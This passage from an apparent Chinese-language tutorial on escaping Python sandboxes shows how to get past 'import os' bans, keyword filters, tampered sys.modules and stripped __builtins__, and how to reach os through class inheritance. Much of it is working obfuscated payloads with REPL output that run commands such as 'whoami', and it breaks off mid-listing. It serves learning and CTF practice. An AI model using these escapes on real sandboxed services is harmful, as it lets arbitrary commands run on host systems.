title="image-20250124202651867"><h2 id="禁止import-os"><a href="#禁止import-os" class="headerlink" title="禁止import os"></a>禁止import os</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span>   os<br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">import</span> importlib<br>importlib.import_module(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">import</span> imp<br><br><span class="hljs-comment"># 查找 &#x27;os&#x27; 模块</span><br>file, path, description = imp.find_module(<span class="hljs-string">&#x27;os&#x27;</span>)<br><span class="hljs-comment"># 加载 &#x27;os&#x27; 模块</span><br>os_module = imp.load_module(<span class="hljs-string">&#x27;os&#x27;</span>, file, path, description)<br><span class="hljs-comment"># 访问 &#x27;os&#x27; 模块中的 &#x27;system&#x27; 函数</span><br>os_module.system(<span class="hljs-string">&#x27;echo Hello, World!&#x27;</span>)<br><span class="hljs-keyword">or</span><br>execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)<br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-comment">#通用</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.11/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">exec</span>(f.read())<br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>如果禁用了import os，可以使用空格绕过，如果空格被过滤，可以尝试<code>__import__</code>：<code>__import__(&#39;os&#39;)</code>，<code>__import__</code>被禁了还有 <code>importlib</code>(Python3.x)，imp(Python2.x)，execfile()（Python2.x）等等</p><p>最后两种方法都需要库的路径一般情况下都是默认的，还有方法找路径的话就是用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-built_in">print</span>(sys.path)<br></code></pre></td></tr></table></figure><h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">&#x27;o&#x27;</span><br>a = <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-built_in">__import__</span>(a+b).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])<br>yankun\administrator<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="hljs-number">1</span>])<br>yankun\administrator<br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>对于绕过操作还有很多比如说：逆序、变量拼接、base64、hex、rot13等等</p><h2 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h2><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是<strong>刚启动</strong>的话，所列出的模块就是解释器在<strong>启动时自动加载的模块</strong>。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p><p>如果将 os 从 sys.modules 中剔除或者改变，os 就彻底没法用了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span><br>AttributeError: <span class="hljs-string">&#x27;str&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;system&#x27;</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>假如遇到上面这种让os模块成了字符串，绕过思路就是将其删除掉，重新加载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><span class="hljs-comment"># </span><br><br><span class="hljs-keyword">del</span> sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h2><p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法<strong>直接做编码</strong>等等操作。</p><p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br><span class="hljs-built_in">print</span>(os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <br><span class="hljs-built_in">print</span>(os.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br></code></pre></td></tr></table></figure><p>应该还有一些，可以在这里找找：</p><ol><li>Python2.x ：<a href="https://docs.python.org/2/library/os.html">https://docs.python.org/2/library/os.html</a></li><li>Python3.x ：<a href="https://docs.python.org/3/library/os.html">https://docs.python.org/3/library/os.html</a></li></ol><h2 id="其次，可以通过-getattr拿到对象的方法、属性："><a href="#其次，可以通过-getattr拿到对象的方法、属性：" class="headerlink" title="其次，可以通过 getattr拿到对象的方法、属性："></a>其次，可以通过 getattr拿到对象的方法、属性：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-keyword">or</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(__builtins__, <span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性&#x2F;方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。</p><h2 id="builtin-，builtins与-builtins"><a href="#builtin-，builtins与-builtins" class="headerlink" title="__builtin__，builtins与__builtins__"></a><code>__builtin__</code>，<code>builtins</code>与<code>__builtins__</code></h2><p>在python2.x的版本中，内置模块被命名为了<code>__builtin__</code>，到了python3.x就成了builtins都需要将其导入才能查看：</p><p>2.x:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> __builtin__<br><span class="hljs-meta">&gt;&gt;&gt; </span>__builtin__<br>&lt;module <span class="hljs-string">&#x27;__builtin__&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p>3.x：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> builtins<br><span class="hljs-meta">&gt;&gt;&gt; </span>builtins<br>&lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p><code>__builtins__</code>实际就是<code>__builtin__</code>，<code>builtins</code>的引用，它不需要导入即可使用，但是<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>还是有一个小区别，就是在局部的作用域中（一个函数内部，比如说<code> print(eval(inp, &#123;&quot;__builtins__&quot;: None, &#39;f&#39;: f, &#39;eval&#39;: ev4l&#125;))</code>）<code>__builtins__</code> 就是是一个字典类似于<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身。还有我觉得有必要了解下Python 对函数、变量、类等等的查找方式是按 LEGB 规则来找的。</p><h3 id="那什么是LEGB呢？"><a href="#那什么是LEGB呢？" class="headerlink" title="那什么是LEGB呢？"></a>那什么是LEGB呢？</h3><ol><li>L（Local）——局部作用域<ul><li>当前函数或代码块内部定义的变量。</li><li>如果在函数内定义了一个变量，Python 首先会在当前函数的局部作用域内查找。</li></ul></li><li>E（Enclosing）——闭包函数外的局部作用域<ul><li>如果局部作用域中没有找到变量，Python 会查找<strong>外层函数</strong>（即闭包）中定义的变量。</li><li>适用于嵌套函数的场景，即函数内部定义了另一个函数。</li></ul></li><li>G（Global）——全局作用域<ul><li>如果在局部和闭包作用域中都找不到变量，Python 会查找模块的全局作用域。</li><li>全局作用域中的变量通常定义在脚本的顶层，或者是 <code>global</code> 声明的变量。</li></ul></li><li>B（Built-in）——内置作用域<ul><li>如果上述作用域都找不到变量，Python 会在内置作用域中查找。</li><li>内置作用域包含 Python 语言提供的内置函数和变量，例如 <code>len()</code>、<code>print()</code> 和 <code>Exception</code>。</li></ul></li></ol><h4 id="查找顺序："><a href="#查找顺序：" class="headerlink" title="查找顺序："></a>查找顺序：</h4><p>Python 遇到变量时会按照 <strong>L → E → G → B</strong> 的顺序依次查找，直到找到匹配的变量为止。如果所有作用域都找不到，会抛出 <code>NameError</code>。</p><p>回归话题<code>__builtins__</code>有很多有意思的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;__import__&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;execfile&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>如果遇到将<code>__builtins__</code>里面的危险函数删除又该如何绕过嘞？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">del</span> __builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>]<br></code></pre></td></tr></table></figure><p>可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。但是，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。</p><p>注意：2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code></p><h2 id="继承关系绕过"><a href="#继承关系绕过" class="headerlink" title="继承关系绕过"></a>继承关系绕过</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>其中<code>__mro__</code>，是个元组，记录了继承关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:<br><span class="hljs-meta">... </span><span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br>()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-meta">... </span><span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br>(<span class="hljs-string">&#x27;object&#x27;</span>&gt;,)<br></code></pre></td></tr></table></figure><p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p><p>由于：没法直接引入 os，那么假如有个库叫A，在A中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> site<br><span class="hljs-meta">&gt;&gt;&gt; </span>site.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> site<br><span class="hljs-meta">&gt;&gt;&gt; </span>os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span><br>NameError: name <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> defined<br><span class="hljs-meta">&gt;&gt;&gt; </span>os = reload(site.os)<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>所有类都继承object，那么看看他的子类(Python2.x)，（Python3.x，<code>for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print(i)</code>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> i<br><span class="hljs-meta">... </span><br>(<span class="hljs-number">0</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;)<br>(<span class="hljs-number">1</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;)<br>(<span class="hljs-number">2</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">3</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">4</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;)<br>(<span class="hljs-number">5</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;)<br>(<span class="hljs-number">6</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;)<br>(<span class="hljs-number">7</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;)<br>(<span class="hljs-number">8</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;)<br>(<span class="hljs-number">9</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;)<br>(<span class="hljs-number">10</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;)<br>(<span class="hljs-number">11</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;)<br>(<span class="hljs-number">12</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;)<br>(<span class="hljs-number">13</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;)<br>(<span class="hljs-number">14</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;)<br>(<span class="hljs-number">15</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;)<br>(<span class="hljs-number">16</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">17</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;)<br>(<span class="hljs-number">18</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;)<br>(<span class="hljs-number">19</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;)<br>(<span class="hljs-number">20</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;)<br>(<span class="hljs-number">21</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;)<br>(<span class="hljs-number">22</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;)<br>(<span class="hljs-number">23</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;)<br>(<span class="hljs-number">24</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;)<br>(<span class="hljs-number">25</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;)<br>(<span class="hljs-number">26</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;)<br>(<span class="hljs-number">27</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;)<br>(<span class="hljs-number">28</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;)<br>(<span class="hljs-number">29</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;)<br>(<span class="hljs-number">30</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;)<br>(<span class="hljs-number">31</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;)<br>(<span class="hljs-number">32</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;)<br>(<span class="hljs-number">33</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">34</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;)<br>(<span class="hljs-number">35</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">36</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">37</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;)<br>(<span class="hljs-number">38</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;)<br>(<span class="hljs-number">39</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">40</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;)<br>(<span class="hljs-number">41</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;)<br>(<span class="hljs-number">42</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;)<br>(<span class="hljs-number">43</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">44</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">45</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;)<br>(<span class="hljs-number">46</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;)<br>(<span class="hljs-number">47</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;)<br>(<span class="hljs-number">48</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;)<br>(<span class="hljs-number">49</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;)<br>(<span class="hljs-number">50</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;)<br>(<span class="hljs-number">51</span>, &lt;<span class="hljs-built_in">type</span> <span 